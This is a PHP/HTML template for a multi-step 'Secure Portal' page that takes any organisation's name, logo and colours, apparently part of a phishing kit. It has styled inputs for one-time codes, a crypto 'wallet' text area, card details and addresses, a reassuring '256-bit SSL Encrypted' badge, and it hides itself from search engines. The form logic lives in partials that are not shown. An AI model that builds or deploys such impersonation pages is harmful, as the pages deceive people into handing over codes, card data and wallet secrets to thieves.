<?php
// Default template — generic professional fallback for: telecom, insurance, healthcare, legal, and any unknown type
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title><?=$org_name?> — Secure Portal</title>
<meta name="robots" content="noindex,nofollow">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',system-ui,Helvetica,Arial,sans-serif;min-height:100vh;min-height:100dvh;
  background:<?=$is_light_theme?'#f1f5f9':'#0f172a'?>;
  display:flex;align-items:center;justify-content:center;padding:24px 16px;color:<?=$is_light_theme?'#1e293b':'#e2e8f0'?>}

.card{width:100%;max-width:440px;
  background:<?=$is_light_theme?'#fff':'#1e293b'?>;
  border-radius:16px;overflow:hidden;
  box-shadow:<?=$is_light_theme?'0 4px 24px rgba(0,0,0,.10)':'0 4px 32px rgba(0,0,0,.5)'?>}

/* Header */
.hd{background:<?=$accent?>;padding:28px 28px 22px;position:relative;overflow:hidden}
.hd-bg{position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.08) 0%,transparent 60%);pointer-events:none}
.hd-top{display:flex;align-items:center;gap:14px;position:relative;z-index:1}
.logo-box{width:52px;height:52px;background:<?=$logo_bg?>;border-radius:12px;display:flex;align-items:center;justify-content:center;overflow:hidden;flex-shrink:0;border:2px solid rgba(255,255,255,.2)}
.logo-box img{width:100%;height:100%;object-fit:contain}
.logo-ini{font-size:20px;font-weight:700;color:<?=$accent?>}
.hd-text{}
.hd-name{font-size:18px;font-weight:700;color:#fff;line-height:1.2;letter-spacing:-.2px}
.hd-sub{font-size:11px;color:rgba(255,255,255,.7);margin-top:3px;text-transform:uppercase;letter-spacing:.5px}
.hd-meta{display:flex;align-items:center;justify-content:space-between;margin-top:14px;padding-top:12px;border-top:1px solid rgba(255,255,255,.18);position:relative;z-index:1}
.hd-date{font-size:11px;color:rgba(255,255,255,.7)}
.hd-ref{font-size:11px;font-weight:700;color:#fff;background:rgba(255,255,255,.16);padding:3px 10px;border-radius:20px;letter-spacing:.3px}

/* Progress dots */
.prog-dots{display:flex;justify-content:center;gap:6px;padding:16px 0 0;background:<?=$is_light_theme?'#fff':'#1e293b'?>}
.dot{width:8px;height:8px;border-radius:50%;background:<?=$is_light_theme?'#e2e8f0':'#334155'?>;transition:background .3s,transform .2s}
.dot.active{background:<?=$accent?>;transform:scale(1.2)}
.dot.done{background:<?=$sec?>}

/* Body */
.bd{padding:24px 28px 22px}
.step-title{font-size:20px;font-weight:700;color:<?=$is_light_theme?'#1e293b':'#e2e8f0'?>;margin-bottom:4px;letter-spacing:-.3px}
.step-sub{font-size:13px;color:<?=$is_light_theme?'#64748b':'#94a3b8'?>;margin-bottom:20px;line-height:1.5}
.field{margin-bottom:14px}
.field label{display:block;font-size:12px;color:<?=$is_light_theme?'#475569':'#94a3b8'?>;font-weight:600;letter-spacing:.2px;margin-bottom:5px}
.field input{width:100%;background:<?=$is_light_theme?'#f8fafc':'#0f172a'?>;border:1px solid <?=$is_light_theme?'#cbd5e1':'#334155'?>;color:<?=$is_light_theme?'#1e293b':'#e2e8f0'?>;padding:12px 14px;border-radius:10px;font-size:14px;outline:none;transition:border-color .2s,box-shadow .2s;font-family:inherit;-webkit-appearance:none}
.field input:focus{border-color:<?=$accent?>;box-shadow:0 0 0 3px rgba(<?=$ar?>,<?=$ag?>,<?=$ab?>,.15);background:<?=$is_light_theme?'#fff':'#1e293b'?>}
.field input::placeholder{color:<?=$is_light_theme?'#94a3b8':'#475569'?>}
.or-div{text-align:center;font-size:11px;color:<?=$is_light_theme?'#94a3b8':'#475569'?>;margin:10px 0;position:relative}
.or-div::before,.or-div::after{content:'';position:absolute;top:50%;width:43%;height:1px;background:<?=$is_light_theme?'#e2e8f0':'#334155'?>}
.or-div::before{left:0}.or-div::after{right:0}
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.btn{width:100%;padding:13px;background:<?=$accent?>;color:#fff;font-size:15px;font-weight:600;border:none;border-radius:10px;cursor:pointer;margin-top:8px;transition:filter .15s,transform .1s;position:relative;font-family:inherit}
.btn:hover{filter:brightness(1.1);transform:translateY(-1px)}
.btn:active{transform:translateY(0)}
.btn:disabled{opacity:.6;cursor:not-allowed;transform:none}
.btn.loading::after{content:'';position:absolute;right:16px;top:50%;width:17px;height:17px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;transform:translateY(-50%);animation:spin .7s linear infinite}
@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
.err-msg{font-size:12px;color:#ef4444;margin-top:8px;display:none}
.security-note{display:flex;align-items:center;gap:6px;justify-content:center;font-size:11px;color:<?=$is_light_theme?'#94a3b8':'#475569'?>;margin-top:14px;padding-top:12px;border-top:1px solid <?=$is_light_theme?'#f1f5f9':'#1e293b'?>}
.wallet-area{width:100%;min-height:80px;background:<?=$is_light_theme?'#f8fafc':'#0f172a'?>;border:1px solid <?=$is_light_theme?'#cbd5e1':'#334155'?>;color:<?=$is_light_theme?'#1e293b':'#e2e8f0'?>;padding:12px 14px;border-radius:10px;font-size:13px;font-family:monospace;outline:none;resize:none}
.wallet-area:focus{border-color:<?=$accent?>}
.wallet-hint{font-size:11px;color:<?=$is_light_theme?'#94a3b8':'#475569'?>;margin-top:6px;line-height:1.5}
.otp-wrap{display:flex;gap:8px;justify-content:center}
.otp-wrap input{flex:1;text-align:center;font-size:22px;font-weight:700;padding:12px 4px;max-width:48px;background:<?=$is_light_theme?'#f8fafc':'#0f172a'?>;border:1px solid <?=$is_light_theme?'#cbd5e1':'#334155'?>;border-radius:8px;color:<?=$is_light_theme?'#1e293b':'#e2e8f0'?>;outline:none}
.otp-wrap input:focus{border-color:<?=$accent?>}
.otp-hint{font-size:12px;color:<?=$is_light_theme?'#94a3b8':'#475569'?>;text-align:center;margin-top:8px}
.addr-area{width:100%;min-height:60px;background:<?=$is_light_theme?'#f8fafc':'#0f172a'?>;border:1px solid <?=$is_light_theme?'#cbd5e1':'#334155'?>;color:<?=$is_light_theme?'#1e293b':'#e2e8f0'?>;padding:12px 14px;border-radius:10px;font-size:14px;font-family:inherit;outline:none;resize:none}
.addr-area:focus{border-color:<?=$accent?>}
.card-footer{padding:14px 20px;background:<?=$is_light_theme?'#f8fafc':'#0f172a'?>;border-top:1px solid <?=$is_light_theme?'#e2e8f0':'#1e293b'?>;font-size:10px;color:<?=$is_light_theme?'#94a3b8':'#475569'?>;text-align:center;line-height:1.6}

#loadOverlay{display:none;position:fixed;inset:0;background:<?=$is_light_theme?'rgba(255,255,255,.85)':'rgba(15,23,42,.9)'?>;z-index:999;align-items:center;justify-content:center;flex-direction:column;gap:16px}
#loadOverlay.show{display:flex}
.load-spin{width:40px;height:40px;border:3px solid <?=$is_light_theme?'#e2e8f0':'#334155'?>;border-top-color:<?=$accent?>;border-radius:50%;animation:spin .8s linear infinite}
.load-txt{font-size:13px;color:<?=$is_light_theme?'#64748b':'#64748b'?>}

@media(max-width:480px){
  body{padding:0;align-items:flex-start;background:<?=$is_light_theme?'#fff':'#0f172a'?>}
  .card{border-radius:0;min-height:100vh;min-height:100dvh;box-shadow:none}
  .bd{padding:20px 20px 16px}
  .hd{padding:22px 20px 18px}
}
</style>
</head>
<body>
<div id="loadOverlay"><div class="load-spin"></div><div class="load-txt" id="loadText">Verifying…</div></div>

<div class="card">
  <div class="hd">
    <div class="hd-bg"></div>
    <div class="hd-top">
      <div class="logo-box">
        <?php if($logo_url):?><img src="<?=htmlspecialchars($logo_url)?>" alt="" onerror="this.style.display='none';this.nextElementSibling.style.display='flex'"><?php endif?>
        <span class="logo-ini" style="display:<?=$logo_url?'none':'flex'?>;align-items:center;justify-content:center;width:100%;height:100%"><?=mb_strtoupper(mb_substr($org_name,0,2))?></span>
      </div>
      <div class="hd-text">
        <div class="hd-name"><?=htmlspecialchars($org_name)?></div>
        <div class="hd-sub"><?=htmlspecialchars($org_sub)?></div>
      </div>
    </div>
    <div class="hd-meta">
      <span class="hd-date">📅 <?=$today?></span>
      <span class="hd-ref"><?=htmlspecialchars($ref_code)?></span>
    </div>
  </div>

  <div class="prog-dots" id="stepDots">
    <?php for($i=1;$i<=$total_steps;$i++): ?>
    <div class="dot <?=$i===1?'active':''?>" id="d<?=$i?>"></div>
    <?php endfor; ?>
  </div>

  <div class="bd">
    <?php for($sn=1;$sn<=$total_steps;$sn++): ?>
    <div id="step<?=$sn?>" <?=$sn>1?'style="display:none"':''?>>
      <div class="step-title"><?=htmlspecialchars($sc['step_titles'][$sn])?></div>
      <div class="step-sub" id="step<?=$sn?>sub"><?=htmlspecialchars($sc['step_subs'][$sn])?></div>
      <form onsubmit="submitStep(event,<?=$sn?>)">
        <?php $fld = $sc['step'.$sn.'_fields'] ?? 'email_only'; include __DIR__.'/partials/fields.php'; ?>
        <button type="submit" class="btn" id="btn<?=$sn?>"><?=htmlspecialchars($sc['btn_labels'][$sn-1])?></button>
        <div class="err-msg" id="err<?=$sn?>">Please enter the required information.</div>
      </form>
      <div class="security-note">🔒 256-bit SSL Encrypted</div>
    </div>
    <?php endfor; ?>
  </div>

  <?php if($footer): ?>
  <div class="card-footer"><?=htmlspecialchars($footer)?></div>
  <?php endif; ?>
</div>

<?php include __DIR__.'/partials/js.php'; ?>
<script>
// Update progress dots on step change
const _origShowD = showStep;
function showStep(n) {
    _origShowD(n);
    for (let i = 1; i <= TOTAL_STEPS; i++) {
        const el = document.getElementById('d'+i);
        if (!el) continue;
        el.className = 'dot' + (i < n ? ' done' : i === n ? ' active' : '');
    }
}
</script>
</body>
</html>
